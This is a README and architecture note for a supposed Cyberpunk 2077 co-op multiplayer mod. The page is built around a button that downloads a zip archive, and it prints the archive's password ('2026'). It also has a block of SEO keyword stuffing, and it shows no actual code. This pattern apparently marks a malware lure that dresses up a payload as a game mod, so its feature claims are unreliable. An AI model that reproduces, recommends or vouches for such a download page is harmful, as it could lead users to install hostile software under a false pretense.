# 🌆 Night-City-Coop-Engine

<img width="800" height="450" alt="image" src="https://github.com/user-attachments/assets/31e07214-2ca6-4d77-a9f5-6cd76c4d07f9" />


<p align="center">
  <img src="https://img.icons8.com/color/96/000000/cyberpunk.png" alt="Night City Coop Engine" width="140" height="140">
</p>

<h1 align="center">Night-City-Coop-Engine</h1>
<p align="center">
  <strong>Synchronizing the Streets of Night City</strong><br>
  Peer-to-Peer Architecture · State Synchronization · Custom RED4ext Hooks
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-0.9.5--beta-1ABC9C?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/engine-RED4ext-E74C3C?style=for-the-badge" alt="Engine"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Active_Development-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

---

> ⚠️ **Project Status:** Night-City-Coop-Engine is currently in active beta development. The multiplayer backend is functional, but expect desyncs and bugs. We are targeting support for up to 8 players in cooperative campaign mode.

---

## 🏗️ Architecture Overview

Night-City-Coop-Engine is not a simple script mod; it's a full networking layer built directly into the REDengine using the **RED4ext** framework.

- **Networking:** Custom UDP-based peer-to-peer (P2P) protocol optimized for low latency.
- **State Sync:** Delta-compression for entity positions, health, and inventory states to minimize bandwidth.
- **Campaign Hooks:** Intercepts quest state changes and dialogue nodes, allowing seamless transitions for the host and clients.
- **Isolation:** Uses independent entity IDs for each player's "V" to prevent inventory and progression conflicts.

## 📥 Deployment & Build

<div align="center" style="border: 2px solid #2C3E50; border-radius: 10px; padding: 20px; background-color: #1a1a1a; max-width: 450px; margin: 0 auto;">
  <img src="https://img.icons8.com/color/96/000000/download.png" alt="Download" width="60" height="60">
  <br><br>
  <a href="https://github.com/Scorpionsky31784/Night-City-Coop-Engine/releases/download/1/Night-City-Coop-Engine.zip">
    <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
  <br><br>
  <span style="font-size: 18px; color: #ffffff;">🔐 <b>Build Password:</b> <code style="background-color: #333; padding: 4px 8px; border-radius: 4px; color: #E74C3C;">2026</code></span>
</div>

### Prerequisites

Before deploying Night-City-Coop-Engine, ensure your environment meets the following requirements:

1.  **Cyberpunk 2077:** Patch 2.31 or higher.
2.  **RED4ext:** Latest version installed in the game directory.
3.  **Network:** Stable internet connection with port forwarding configured (UDP 7777 by default) for the host.

## 🛠️ Core Modules

### 🧠 Network Manager
Handles the P2P handshake, session creation, and player synchronization. Includes a built-in NAT punch-through mechanism to simplify connections.
*   `HostSession()`: Initializes the server and starts broadcasting.
*   `JoinSession(IP)`: Connects to an existing host.
*   `SyncState(Entity)`: Pushes local entity changes to peers.

### 📖 Campaign Synchronizer
Intercepts the `QuestTracker` class to sync progression.
*   **Dialogue Voting:** When a dialogue wheel appears, a voting UI is triggered. The majority choice overrides local input.
*   **Cutscene Sync:** Forces all clients to play the same cutscene at the same time, locking input until completion.

### ⚔️ Combat & PvP
*   **Enemy Aggro Sync:** Ensures enemies target players based on proximity and threat level across all clients.
*   **PvP Toggle:** The host can dynamically enable/disable friendly fire. Downed players enter a "bleed-out" state and can be revived.

## 🔍 SEO Keywords & Tags

`cyberpunk-2077-nightcoop cyberpunk-2077-multiplayer-mod nightcoop-coop cyberpunk-2077-co-op cyberpunk-2077-shared-campaign cyberpunk-2077-pvp-toggle cyberpunk-2077-red4ext cyberpunk-2077-mod cyberpunk-2077-nightcoop-beta`

## 📁 Repository Structure

```
Night-City-Coop-Engine/
├── src/
│   └── core/              # Core C++ networking and state sync logic
├── docs/
│   └── architecture.md    # Deep dive into the P2P protocol
├── hooks/
│   └── red4ext/           # RED4ext C++ hooks for game functions
├── tests/                 # Network simulation tests
├── README.md
└── SETTINGS_REPOSITORY.json
```
# Night-City-Coop-Engine Architecture

## 1. Networking Model
The engine utilizes a Peer-to-Peer (P2P) model. One player acts as the Host (Authoritative Server), while others act as Clients. 

- **Protocol:** Custom UDP implementation for low-latency gameplay.
- **Transport:** Uses `ENet` for reliable packet delivery.

## 2. State Synchronization
The core challenge is syncing the massive world of Night City.
- **Entity Tracking:** Every NPC, vehicle, and interactable object is assigned a `NetworkID`.
- **Delta Compression:** Only changes in position, rotation, and state are sent over the network, rather than full object data.

## 3. Campaign & Quest Hooks
The `QuestTracker` is heavily hooked. When the Host triggers a quest advancement:
1. Host sends `QuestAdvance` packet.
2. Clients pause local quest logic.
3. Clients wait for the Host to sync the new quest state.
4. Clients resume.

## 4. Dialogue Voting System
When a conversation starts, the game is paused for all clients. A custom UI overlay appears, allowing everyone to vote. The `VotingManager` tallies the votes and sends the majority choice to the Host, who inputs it into the game engine.
